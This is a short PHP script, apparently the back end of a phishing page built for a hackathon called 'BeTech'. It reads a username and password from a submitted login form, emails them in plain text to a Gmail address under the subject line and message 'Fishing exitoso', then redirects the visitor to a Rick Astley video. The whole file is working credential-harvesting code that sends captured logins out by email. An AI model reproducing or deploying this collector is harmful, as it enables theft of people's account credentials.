<?php
$to = 'ltomicb@gmail.com';
$subject = 'Hackaton BeTech';
$message = 'Fishing exitoso.';
$user = $_POST["username"];
$pass = $_POST["password"];
$mess = "User: " . $user . "Contraseña: " . $pass;
$headers = 'From: aestrella@example.com' . "\r\n" .
    'Reply-To: aestrella@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $mess , $headers);
header('Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley');
?>